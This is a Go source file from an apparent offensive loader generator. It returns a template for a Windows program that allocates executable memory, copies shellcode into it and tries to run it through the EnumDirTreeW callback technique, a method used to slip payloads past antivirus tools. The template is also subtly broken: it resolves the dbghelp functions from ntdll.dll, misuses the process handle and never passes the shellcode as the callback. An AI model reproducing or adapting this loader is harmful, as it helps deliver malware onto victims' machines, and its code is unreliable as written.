package loaders

import (
	"fmt"
)

func EnumDirTreeWTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
	package main

	import (
		"fmt"
		"os"
		"syscall"
		"unsafe"
		
	)
	
	var (
		kernel32         = syscall.MustLoadDLL("kernel32.dll")
		virtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
		virtualProtect   = kernel32.MustFindProc("VirtualProtect")
		createThread     = kernel32.MustFindProc("CreateThread")
		waitForSingleObj = kernel32.MustFindProc("WaitForSingleObject")
		getCurrentProc   = kernel32.MustFindProc("GetCurrentProcess")
	
		ntdll     = syscall.MustLoadDLL("ntdll.dll")
		rtlMove   = ntdll.MustFindProc("RtlMoveMemory")
		symInit   = ntdll.MustFindProc("SymInitialize")
		enumDir   = ntdll.MustFindProc("EnumDirTreeW")
	)
	
	const (
		memCommit  = 0x00001000
		memReserve = 0x00002000
		pageExec   = 0x40
	)

	
	func ExecuteOrderSixtySix(shellcode []byte) {
		address, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), memReserve|memCommit, pageExec|syscall.PAGE_READWRITE)
		if address == 0 {
			fmt.Println("VirtualAlloc failed:", err)
			return
		}
	
		rtlMove.Call(address, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	
		var oldProtect uint32
		virtualProtect.Call(address, uintptr(len(shellcode)), pageExec, uintptr(unsafe.Pointer(&oldProtect)))
	
		symInit.Call(uintptr(getCurrentProc.Addr), 0, 1)
	
		var dummy [522]uint16
		enumDir.Call(uintptr(getCurrentProc.Addr), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\Windows"))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("*.log"))), uintptr(unsafe.Pointer(&dummy[0])), 0, 0)
	}
	
    `)
}
